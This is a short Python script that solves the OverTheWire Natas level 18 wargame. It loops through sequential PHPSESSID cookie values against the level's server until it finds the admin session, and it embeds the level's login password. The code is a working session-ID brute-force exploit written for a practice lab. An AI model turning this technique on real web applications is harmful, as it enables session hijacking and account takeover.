import requests
maxid = 641
url = "http://natas18.natas.labs.overthewire.org"
user = "natas18"
passwd = "xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP"
match = "You are an admin. The credentials for the next level are:"

for i in range(maxid):
    c = dict(PHPSESSID=str(i)) # need new PHPSESSID each time
    h = requests.get(url, auth=(user, passwd), cookies=c)
    if match in str(h.content):
        print (h.content)
        break
